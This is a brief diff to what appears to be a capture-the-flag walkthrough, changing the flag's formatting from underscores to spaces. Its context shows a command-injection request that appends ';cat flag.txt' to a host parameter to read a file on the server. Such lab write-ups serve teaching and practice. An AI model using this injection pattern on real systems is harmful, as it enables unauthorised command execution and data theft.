@@ -11,7 +11,7 @@ Walkthrough
    ```text
    GET /?host=127.0.0.1;+cat+flag.txt
    ```
-5. Flag output: `flag{command_injection_rce}`.
+5. Flag output: `flag{command injection rce}`.
 
 Flag  
-`flag{command_injection_rce}`
+`flag{command injection rce}`
